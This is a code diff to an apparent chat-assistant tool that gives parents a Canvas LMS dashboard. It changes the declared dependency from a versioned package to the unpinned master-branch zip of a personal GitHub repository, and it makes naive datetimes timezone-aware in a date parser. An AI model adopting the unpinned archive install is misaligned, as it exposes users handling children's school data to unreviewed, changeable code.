@@ -3,7 +3,7 @@ title: Canvas Parent Monitor
 description: Complete parent dashboard for Canvas LMS. List each child's courses, upcoming/missing/completed assignments, current grades, grades by category, teacher announcements, calendar events, assignment details with feedback, course syllabus, teacher contacts, module progress, and recent activity.
 author: Your Name
 version: 0.2.0
-requirements: canvas-parent-api>=0.0.24
+requirements: canvas_parent_api @ https://github.com/Bob2345de/canvas_parent_api/archive/refs/heads/master.zip
 """
 
 import asyncio
@@ -58,13 +58,20 @@ class Tools:
 
     @staticmethod
     def _parse_date(date_str) -> Optional[datetime]:
-        """Parse Canvas ISO-8601 date string (possibly ending in 'Z') to UTC datetime."""
+        """Parse Canvas ISO-8601 date string (possibly ending in 'Z') to a timezone-aware UTC datetime."""
         if not date_str:
             return None
         try:
-            return datetime.fromisoformat(str(date_str).replace("Z", "+00:00"))
+            dt = datetime.fromisoformat(str(date_str).replace("Z", "+00:00"))
         except (ValueError, AttributeError):
             return None
+        # Canvas normally returns UTC dates; if the string had no offset the
+        # parsed datetime is naive, which breaks comparisons against aware
+        # datetimes ("can't compare offset-naive and offset-aware datetimes").
+        # Assume UTC in that case so every returned datetime is aware.
+        if dt.tzinfo is None:
+            dt = dt.replace(tzinfo=timezone.utc)
+        return dt
 
     @classmethod
     def _fmt_dt(cls, date_str, with_time: bool = True) -> str:
